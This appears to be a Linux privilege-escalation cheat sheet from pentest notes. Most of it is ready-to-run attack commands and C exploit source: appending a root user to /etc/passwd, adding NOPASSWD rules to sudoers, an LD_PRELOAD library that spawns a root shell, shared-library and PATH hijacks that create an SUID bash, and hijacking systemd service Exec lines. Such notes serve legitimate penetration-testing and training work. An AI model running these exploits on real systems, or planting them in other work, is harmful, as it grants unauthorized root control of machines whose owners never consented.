# Privileges Exploitation

## Writable /etc/passwd

Create a new user entry in root group and append it to the /etc/passwd file

```bash
echo "<username>:$(openssl passwd <password>):0:0:/root:/root:/bin/bash" >> /etc/passwd
```

## Writable /etc/sudoers

Allow current user to invoke any program with sudo without needing the password

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

## Elevated shell with sticky bit

By exploiting an application running as root (for instance a database or a script) it is possible to obtain an elevated shell by executing the following commands within the elevated application:

```bash
cp /bin/dash /tmp/<file>
chmod u+s /tmp/<file>
#execute the elevated shell
/tmp/<file> -p
```

## LD\_PRELOAD

If you find inside the output of `sudo -l` the sentence: env\_keep+=LD\_PRELOAD and you can call some command with sudo, you can escalate privileges.

#### exploit code

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

#### compile and execute

```bash
cd /tmp
gcc -fPIC -shared -o pv.so <file>.c -nostartfiles
sudo LD_PRELOAD=pv.so <any command you can call with sudo>
```

## SUID exploit

### Built-in exploitable binaries

{% embed url="https://gtfobins.github.io/" %}

### Shared library hijack

#### check for missing .so files

```bash
strace <binary> 2>&1 | grep -i -E "open|access|no such file"
ldd <file> | grep "not found"
```

#### Shared library code

Put the file in the path of the missing library or replace it if you can write in the folder.

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

#### Compile as

```bash
gcc -shared -o <path to library> -fPIC <file>.c
```

### Relative path hijack

#### Find calls to system binaries in executable file

Search for calls to executables with relative paths, for instance instead of `/bin/cp` look for `cp`

```bash
strings <file>    #static calls
ltrace <file>     #library calls during execution
```

#### boilerplate code

```bash
#include <stdio.h>
#include <stdlib.h>

int main(){
setresuid(0,0,0);
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
return 0;
}
```

#### compile and execute

Add the /tmp folder to the $PATH variable and compile the malicious program with the same name as the relative path executable invoked in the vulnerable executable. In this way the generated malicious program will be detected and executed before the system one.

```bash
export $PATH=/tmp:$PATH
gcc -o /tmp/<name>.so <name>.c -s --static
/<path to vuln binary>
```

## Writable service files

Can be found by searching for .service files with write permission or by checking write permissions with sudo -l

### File template

the Exec\* instructions can be hijacked to execute arbitrary scripts

```
[Unit]
Description=The NGINX HTTP and reverse proxy server
After=syslog.target network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
PIDFile=/run/nginx.pid
ExecStartPre=/usr/sbin/nginx -t
ExecStart=/usr/sbin/nginx
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

The basic structure of a service file is the following:

```
[Unit]
Description=Foo

[Service]
ExecStart=/usr/sbin/foo-daemon

[Install]
WantedBy=multi-user.target
```

### Manage services

```
which <deamon>                    get the path to the running deamon
sudo systemctl start <deamon>     start deamon        
sudo systemctl stop <deamon>      stop deamon
sudo systemctl restart <deamon>   restart deamon
systemctl status <deamon>         get status info
sudo systemctl enable <deamon>    launch deamon on startup
journalctl -u <deamon>            access logs for given deamon
```

